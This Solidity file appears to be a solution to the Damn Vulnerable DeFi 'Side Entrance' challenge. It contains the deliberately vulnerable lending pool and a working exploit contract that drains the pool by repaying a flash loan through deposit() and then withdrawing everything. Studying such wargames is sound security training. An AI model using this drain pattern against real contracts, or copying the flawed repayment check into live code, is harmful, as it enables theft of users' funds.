// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    using Address for address payable;

    mapping (address => uint256) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");
        
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
    }
}

/** EXPLOIT | Call the flash loan for all the balance and before repaying deposit with the lender on your account balance. 
    After the flash loan finishes without errors, withdraw your balance with the lender. All the execution in a single transaction. */
contract SideEntranceExploit {
    SideEntranceLenderPool public pool; 

    constructor (address _pool){
        pool = SideEntranceLenderPool(_pool);
    }

    fallback() external payable {}
    receive() external payable {}

   function attack () external {
        //STEP 1
        pool.flashLoan(address(pool).balance);
        //STEP 3
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable {
        //STEP 2
        pool.deposit{value: msg.value}();
    }
}